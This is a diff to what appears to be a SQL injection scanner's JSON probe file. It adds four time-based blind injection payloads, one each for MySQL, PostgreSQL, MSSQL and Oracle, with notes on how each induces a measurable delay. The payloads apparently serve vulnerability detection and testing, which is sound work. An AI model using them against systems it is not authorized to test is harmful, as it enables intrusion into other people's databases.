@@ -60,6 +60,36 @@
       "description": "Statement separator — reveals stacked-query support (PostgreSQL, MSSQL)"
     }
   ],
+  "time_based_probes": [
+    {
+      "id": "sqli_time_mysql",
+      "dbms": "MySQL",
+      "value": "' OR SLEEP(4)-- -",
+      "delay_seconds": 4,
+      "description": "Boolean-context SLEEP() — reliable blind-injection timing oracle for MySQL/MariaDB."
+    },
+    {
+      "id": "sqli_time_postgresql",
+      "dbms": "PostgreSQL",
+      "value": "'; SELECT pg_sleep(4)-- -",
+      "delay_seconds": 4,
+      "description": "Stacked-query pg_sleep() — requires the driver to allow multiple statements."
+    },
+    {
+      "id": "sqli_time_mssql",
+      "dbms": "MSSQL",
+      "value": "'; WAITFOR DELAY '0:0:4'-- -",
+      "delay_seconds": 4,
+      "description": "Stacked-query WAITFOR DELAY — native MSSQL timing primitive."
+    },
+    {
+      "id": "sqli_time_oracle",
+      "dbms": "Oracle",
+      "value": "' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- -",
+      "delay_seconds": 4,
+      "description": "Cartesian-product heavy query — Oracle has no unprivileged native sleep, so delay is induced via computation cost instead."
+    }
+  ],
   "dbms_error_patterns": {
     "description": "Compiled regex patterns matching known DBMS error strings. Keys are DBMS names; values are lists of regex patterns. All patterns are case-INSENSITIVE.",
     "patterns": {
